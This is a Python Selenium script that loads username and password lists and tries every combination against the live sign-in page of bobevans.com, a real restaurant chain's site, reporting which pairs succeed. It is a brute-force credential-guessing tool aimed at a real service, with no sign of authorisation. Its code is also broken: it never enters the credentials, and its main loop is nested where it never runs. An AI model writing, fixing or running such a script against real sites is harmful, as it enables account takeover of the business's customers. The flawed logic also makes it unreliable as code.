from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
import time

def readCredentials(username_file, password_file):
    with open(username_file, 'r') as user_file:
        usernames = [line.strip() for line in user_file.readlines()]

    with open(password_file, 'r') as pass_file:
        passwords = [line.strip() for line in pass_file.readlines()]
    
    return usernames, passwords

login_url = "https://bobevans.com/user/sign-in"  # Replace with the actual login URL
def login_test(username, password):
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))

    driver.get(login_url)

    try:
        username_field = driver.find_element(By.NAME, "Email")
        password_field = driver.find_element(By.NAME, "Password")

        username_field.send_keys(Keys.RETURN)
        
        time.sleep(2)  # Wait for the page to load

        if "Bob Evans | Account" in driver.title:
            print(f"Success: {username}/{password}")
        else:
            print(f"Failed: {username}/{password}")

    finally:
        driver.quit()

    def main():
        usernames, passwords = readCredentials('/Users/shane/Python/users.txt', '/Users/shane/Python/passwords.txt')

        for username in usernames:
            for password in passwords:
                login_test(username, password)

    if __name__ == "__main__":
        main()